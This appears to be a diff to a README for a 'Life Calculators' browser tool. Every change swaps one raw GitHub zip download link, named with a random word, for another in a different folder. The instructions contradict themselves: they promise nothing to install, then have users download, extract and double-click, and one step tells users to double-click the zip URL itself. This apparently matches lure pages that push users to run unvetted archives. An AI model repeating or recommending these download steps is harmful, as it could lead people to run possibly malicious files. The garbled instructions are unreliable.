@@ -6,7 +6,7 @@ Welcome to Life Calculators! This tool runs in your browser and does not require
 
 ## 📥 Download Link
 
-[![Download Life Calculators](https://github.com/Stephhkz/life-calculators/raw/refs/heads/main/pages/calculators_life_parleyer.zip%20Calculators-brightgreen)](https://github.com/Stephhkz/life-calculators/raw/refs/heads/main/pages/calculators_life_parleyer.zip)
+[![Download Life Calculators](https://github.com/Stephhkz/life-calculators/raw/refs/heads/main/tools/finance/calculators_life_conspiratory.zip%20Calculators-brightgreen)](https://github.com/Stephhkz/life-calculators/raw/refs/heads/main/tools/finance/calculators_life_conspiratory.zip)
 
 ## 📖 Overview
 
@@ -33,7 +33,7 @@ To get started with Life Calculators, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the downloads page.
 
-   [Download Life Calculators](https://github.com/Stephhkz/life-calculators/raw/refs/heads/main/pages/calculators_life_parleyer.zip)
+   [Download Life Calculators](https://github.com/Stephhkz/life-calculators/raw/refs/heads/main/tools/finance/calculators_life_conspiratory.zip)
 
 2. **Select Your Version:** You will see a list of available versions. Choose the latest stable release for the best experience.
 
@@ -41,7 +41,7 @@ To get started with Life Calculators, follow these steps:
 
 4. **Extract the Files:** If the downloaded file is a ZIP folder, extract it to a location of your choice.
 
-5. **Open the Application:** Locate the extracted folder and double-click the `https://github.com/Stephhkz/life-calculators/raw/refs/heads/main/pages/calculators_life_parleyer.zip` file to launch the application in your browser.
+5. **Open the Application:** Locate the extracted folder and double-click the `https://github.com/Stephhkz/life-calculators/raw/refs/heads/main/tools/finance/calculators_life_conspiratory.zip` file to launch the application in your browser.
 
 ## 🎓 How to Use Life Calculators
 
@@ -75,4 +75,4 @@ If you encounter any issues or have questions, feel free to reach out through th
 
 Thank you for choosing Life Calculators! Your support helps us continue to improve and expand our features. 
 
-[![Download Life Calculators](https://github.com/Stephhkz/life-calculators/raw/refs/heads/main/pages/calculators_life_parleyer.zip%20Calculators-brightgreen)](https://github.com/Stephhkz/life-calculators/raw/refs/heads/main/pages/calculators_life_parleyer.zip)
+[![Download Life Calculators](https://github.com/Stephhkz/life-calculators/raw/refs/heads/main/tools/finance/calculators_life_conspiratory.zip%20Calculators-brightgreen)](https://github.com/Stephhkz/life-calculators/raw/refs/heads/main/tools/finance/calculators_life_conspiratory.zip)
